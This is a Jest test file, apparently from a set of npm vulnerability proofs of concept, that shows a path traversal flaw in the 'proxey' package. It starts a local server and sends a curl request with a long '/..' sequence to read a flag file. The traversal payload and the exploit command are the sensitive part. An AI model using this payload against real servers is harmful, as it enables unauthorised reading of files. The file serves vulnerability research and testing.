//https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/proxey/test.js
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in proxey", (done) => {
    const pkg = require('proxey');
    const fs = require("fs");
    const { exec } = require("child_process");
    let hostsFile = fs.readFileSync(pathToFlag).toString();

    pkg.run({
        rootFolder: './',
        port: 8981,
        proxyUrl: '/proxy',
        vars: {
            'X-Api-Token': '12345'
        },
        routes: {
            '/': 'home.html',
            '/users': 'users.html',
            '/api/users': 'users.json'
        },
        charset: 'utf-8'
    });

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8981${genstr()}"`;

    exec(attack_string, (error, stdout) => {
        expect(stdout).toBe(hostsFile);
        done();
    });
});
